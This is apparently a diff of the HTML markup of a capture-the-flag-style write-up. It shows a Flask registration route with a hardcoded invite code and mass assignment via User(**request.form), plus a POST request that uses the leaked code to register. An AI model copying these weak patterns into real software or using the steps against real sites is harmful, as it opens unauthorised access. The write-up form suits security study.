-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/register&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">register</span>():
-</span></span><span style="display:flex;"><span>    login_form <span style="color:#ff79c6">=</span> LoginForm(request<span style="color:#ff79c6">.</span>form)
-</span></span><span style="display:flex;"><span>    create_account_form <span style="color:#ff79c6">=</span> CreateAccountForm(request<span style="color:#ff79c6">.</span>form)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;register&#39;</span> <span style="color:#ff79c6">in</span> request<span style="color:#ff79c6">.</span>form:
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        username  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;username&#39;</span>]
-</span></span><span style="display:flex;"><span>        email     <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;email&#39;</span>   ]
-</span></span><span style="display:flex;"><span>        code	  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;invite_code&#39;</span>]
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> code <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;code-500.html&#39;</span>)
-</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(email<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first()
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> data <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span> <span style="color:#ff79c6">and</span> code <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
-</span></span><span style="display:flex;"><span>            [<span style="color:#ff79c6">..</span>]
-</span></span><span style="display:flex;"><span>            <span style="color:#6272a4"># else we can create the user</span>
-</span></span><span style="display:flex;"><span>            user <span style="color:#ff79c6">=</span> User(<span style="color:#ff79c6">**</span>request<span style="color:#ff79c6">.</span>form)
-</span></span><span style="display:flex;"><span>            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>add(user)
-</span></span><span style="display:flex;"><span>            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>commit()
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">@blueprint<span style="color:#ff79c6">.</span>route(<span style="color:#f1fa8c">&#39;/register&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;GET&#39;</span>, <span style="color:#f1fa8c">&#39;POST&#39;</span>])
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">register</span>():
+    login_form <span style="color:#ff79c6">=</span> LoginForm(request<span style="color:#ff79c6">.</span>form)
+    create_account_form <span style="color:#ff79c6">=</span> CreateAccountForm(request<span style="color:#ff79c6">.</span>form)
+    <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#39;register&#39;</span> <span style="color:#ff79c6">in</span> request<span style="color:#ff79c6">.</span>form:
+
+        username  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;username&#39;</span>]
+        email     <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;email&#39;</span>   ]
+        code	  <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>form[<span style="color:#f1fa8c">&#39;invite_code&#39;</span>]
+        <span style="color:#ff79c6">if</span> code <span style="color:#ff79c6">!=</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
+            <span style="color:#ff79c6">return</span> render_template(<span style="color:#f1fa8c">&#39;code-500.html&#39;</span>)
+        data <span style="color:#ff79c6">=</span> User<span style="color:#ff79c6">.</span>query<span style="color:#ff79c6">.</span>filter_by(email<span style="color:#ff79c6">=</span>email)<span style="color:#ff79c6">.</span>first()
+        <span style="color:#ff79c6">if</span> data <span style="color:#ff79c6">is</span> <span style="color:#ff79c6">None</span> <span style="color:#ff79c6">and</span> code <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;XNSS-HSJW-3NGU-8XTJ&#39;</span>:
+            [<span style="color:#ff79c6">..</span>]
+            <span style="color:#6272a4"># else we can create the user</span>
+            user <span style="color:#ff79c6">=</span> User(<span style="color:#ff79c6">**</span>request<span style="color:#ff79c6">.</span>form)
+            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>add(user)
+            db<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>commit()
+</code></pre></td></tr></table>
 </div>
 </div><p>But registration still does not work:</p>
 <pre tabindex="0"><code>POST /register HTTP/1.1
@@ -834,21 +834,21 @@ Upgrade-Insecure-Requests: 1
 
 username=aaaa&amp;email=a%40a.a&amp;password=aaaaaaaa&amp;invite_code=XNSS-HSJW-3NGU-8XTJ
 </code></pre><p>Looking at the deleted forms.py, we can see the form&rsquo;s input are different:</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CreateAccountForm</span>(FlaskForm):
-</span></span><span style="display:flex;"><span>    username <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Username&#39;</span>     , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;username_create&#39;</span> , validators<span style="color:#ff79c6">=</span>[DataRequired()])
-</span></span><span style="display:flex;"><span>    email    <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Email&#39;</span>        , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;email_create&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired(), Email()])
-</span></span><span style="display:flex;"><span>    password <span style="color:#ff79c6">=</span> PasswordField(<span style="color:#f1fa8c">&#39;Password&#39;</span> , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;pwd_create&#39;</span>      , validators<span style="color:#ff79c6">=</span>[DataRequired()])
-</span></span><span style="display:flex;"><span>    invite_code <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Invite Code&#39;</span>, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;invite_code&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired()])
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">CreateAccountForm</span>(FlaskForm):
+    username <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Username&#39;</span>     , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;username_create&#39;</span> , validators<span style="color:#ff79c6">=</span>[DataRequired()])
+    email    <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Email&#39;</span>        , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;email_create&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired(), Email()])
+    password <span style="color:#ff79c6">=</span> PasswordField(<span style="color:#f1fa8c">&#39;Password&#39;</span> , <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;pwd_create&#39;</span>      , validators<span style="color:#ff79c6">=</span>[DataRequired()])
+    invite_code <span style="color:#ff79c6">=</span> TextField(<span style="color:#f1fa8c">&#39;Invite Code&#39;</span>, <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;invite_code&#39;</span>    , validators<span style="color:#ff79c6">=</span>[DataRequired()])
+</code></pre></td></tr></table>
 </div>
 </div>
       </div>
